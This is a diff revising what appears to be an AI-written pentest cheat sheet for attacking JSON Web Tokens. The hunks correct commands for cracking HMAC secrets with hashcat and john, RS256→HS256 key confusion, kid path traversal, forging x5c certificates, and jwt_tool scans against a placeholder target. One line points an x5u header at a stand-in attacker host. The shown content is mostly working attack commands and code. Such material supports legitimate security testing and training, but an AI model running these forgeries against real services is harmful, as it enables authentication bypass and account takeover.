@@ -17,7 +17,7 @@ JSON Web Token attacks — algorithm confusion (RS256→HS256), none algorithm, 
 | `jwt_tool` | Algorithm attacks, none alg, brute force, kid injection — `git clone https://github.com/ticarpi/jwt_tool` |
 | `Burp JWT Editor` | In-proxy JWT modification and signing (BApp Store extension) |
 | `hashcat` | Brute-force HS256/HS384/HS512 secrets — `hashcat -a 0 -m 16500 <jwt> wordlist.txt` |
-| `john` | Alternative JWT secret cracking — `john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256` |
+| `john` | Alternative secret cracking — hashcat 16500 is more reliable for JWTs; john's `HMAC-SHA256` format expects `data#hash`, not a bare token, so convert first |
 | `jwt.io` | Manual decode/inspect (offline use only for sensitive tokens) |
 
 ---
@@ -33,8 +33,9 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflK
 ```bash
 # Decode manually — split on '.' and base64 decode each part
 TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
-echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool   # header
-echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool   # payload
+# base64URL → translate -_ to +/ (the Python one-liner below handles padding cleanly)
+echo $TOKEN | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool   # header
+echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool   # payload
 # Signature is binary — don't decode as text
 
 # Python one-liner decode
@@ -111,12 +112,12 @@ hashcat -a 0 -m 16500 <token> /usr/share/seclists/Passwords/Common-Credentials/1
 # Custom rules
 hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-# Brute force short secrets (≤8 chars)
+# Brute force short secrets (mask below = 6 chars; add ?a per extra char)
 hashcat -a 3 -m 16500 <token> "?a?a?a?a?a?a"
 
-# john the ripper
+# john the ripper — the HMAC-SHA256 format needs `<signing_input>#<sig_hex>`, not a
+# raw JWT. Prefer hashcat -m 16500 above; only use john after converting the token.
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
-# jwt.txt format: just the raw token on one line
 
 # jwt_tool brute force
 python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
@@ -163,9 +164,10 @@ curl -s "https://<target>/.well-known/jwks.json"
 curl -s "https://<target>/api/jwks"
 curl -s "https://<target>/auth/jwks.json"
 
-# Extract the cert from the response / server TLS cert:
+# NOTE: the JWKS key is the real signing key. The TLS cert below is usually a
+# DIFFERENT key and only worth trying as a long shot / when no JWKS is exposed:
 openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem
-# Or from JWKS n/e values — convert to PEM:
+# Preferred — derive PEM from the JWKS n/e values (the actual verification key):
 python3 << 'EOF'
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
 from cryptography.hazmat.primitives import serialization
@@ -224,7 +226,7 @@ import base64, json
 # Generate RSA key
 priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 pub = priv.public_key()
-pub_nums = pub.public_key().public_numbers()   # n, e
+pub_nums = pub.public_numbers()   # n, e
 
 def b64url_int(i):
     b = i.to_bytes((i.bit_length() + 7) // 8, 'big')
@@ -403,7 +405,8 @@ python3 jwt_tool.py <token> -I -hc x5u -hv "http://<attacker-ip>:8000/attacker.c
 # Server uses public key from the embedded cert to verify — inject your own cert
 python3 << 'EOF'
 import base64, json
-# Base64-encode the DER form of the cert (not PEM — strip headers and decode)
+# x5c wants base64(DER). A PEM body already IS base64(DER), so just strip the
+# -----BEGIN/END----- lines and newlines — keep the base64, don't decode it.
 with open("/tmp/attacker.crt") as f:
     pem = f.read()
 der_b64 = pem.strip().replace("-----BEGIN CERTIFICATE-----","").replace("-----END CERTIFICATE-----","").replace("\n","")
@@ -427,10 +430,10 @@ python3 jwt_tool.py <token>
 # Tamper claims interactively
 python3 jwt_tool.py <token> -T
 
-# Run all standard attacks
-python3 jwt_tool.py <token> -X -v
+# Run all checks against a live target (playbook scan — this is the "run everything")
+python3 jwt_tool.py <token> -t "https://<target>/api/profile" -rh "Authorization: Bearer <token>" -M pb
 
-# Specific attacks:
+# Specific attacks (-X takes ONE choice: a/n/b/s/k/i — there is no "-X all"):
 python3 jwt_tool.py <token> -X a          # alg:none
 python3 jwt_tool.py <token> -X n          # null signature
 python3 jwt_tool.py <token> -X k -pk pubkey.pem   # key confusion RS256→HS256
@@ -529,8 +532,8 @@ curl -s "https://<target>/api/login" -d '{"user":"x","pass":"y"}' | grep -oP 'ey
 ## Quick Reference
 
 ```bash
-# Decode token
-echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+# Decode token (base64URL → translate before decoding)
+echo "<token>" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
 
 # Crack secret (hashcat)
 hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
@@ -547,12 +550,12 @@ python3 jwt_tool.py <token> -T -S hs256 -p "secret"
 # kid path traversal (sign with empty string)
 python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
 
-# Run all attacks
-python3 jwt_tool.py <token> -X -v
+# Run all checks (playbook scan against a live target)
+python3 jwt_tool.py <token> -t "https://<target>/api/profile" -rh "Authorization: Bearer <token>" -M pb
 ```
 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
